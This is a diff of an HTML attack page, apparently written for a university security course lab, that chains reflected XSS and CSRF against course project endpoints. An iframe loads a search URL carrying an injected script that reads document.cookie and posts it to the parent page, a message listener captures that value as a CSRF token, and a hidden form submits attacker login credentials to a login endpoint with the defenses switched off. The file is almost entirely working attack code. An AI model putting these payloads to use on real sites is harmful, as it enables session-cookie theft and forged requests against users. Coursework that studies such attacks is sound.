@@ -4,29 +4,21 @@
 <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js">
 </script>
 
-<body>
-<!--   style="display:none"
- --><iframe id = "overallFrame" name = "csrfFrame"></iframe> 
-<form id="csrfForm" method="POST" target="csrfFrame" action="http://cis551.cis.upenn.edu/project3/search?q=%3Cscript%3Eparent.postMessage(document.cookie)%3B%3C%2Fscript%3E">
-    <input type="hidden" name="username" value="attacker" />
-    <input type="hidden" name="password" value="123456" /> 
-</form>
 <script>
 
-var totalstring = "<script" + ">" + "window.parent.postMessage(document.cookie);" + "</" + "script>";
+var totalstring = "<script" + ">" + "alert(document.cookie); window.parent.postMessage(document.cookie);" + "</" + "script>";
 var urlencoded = encodeURIComponent(totalstring);
 var actualURL = "http://cis551.cis.upenn.edu/project3/search?q=" + urlencoded;
-document.getElementById("csrfForm").src = actualURL;
-document.getElementById("overallFrame").contentWindow.location.reload();
+// document.getElementById("csrfForm").src = actualURL;
+// document.getElementById("overallFrame").contentWindow.location.reload();
 console.log(actualURL);
 
 window.addEventListener("message",function (e) {
-
+	console.log(e.data)
 	var input = document.createElement("input");
 	input.type = "hidden";
 	input.name = "csrf_token";
 	input.value = new String(e.data);
-	console.log(e.data)
 	// document.getElementById("form1").appendChild(input);
 	// $.ajax({type: 'POST',data: $('#form1').serialize(),	url: 'https://eecs388.org/project2/login?csrfdefense=1&xssdefense=0',xhrFields:{withCredentials: true}});
 },false);
@@ -38,4 +30,13 @@ window.addEventListener("message",function (e) {
   //   document.getElementById("csrfForm").submit();
   // });
 </script>
+
+<body>
+<!--   style="display:none"
+ --><iframe id = "overallFrame" name = "csrfFrame" src="http://cis551.cis.upenn.edu/project3/search?q=%3Cscript%3Ealert(document.cookie)%3B%20window.parent.postMessage(document.cookie)%3B%3C%2Fscript%3E"></iframe> 
+<form id="csrfForm" method="POST" target="csrfFrame" action="http://cis551.cis.upenn.edu/project3/login?csrfdefense=1&xssdefense=0">
+    <input type="hidden" name="username" value="attacker" />
+    <input type="hidden" name="password" value="123456" /> 
+</form>
+
 
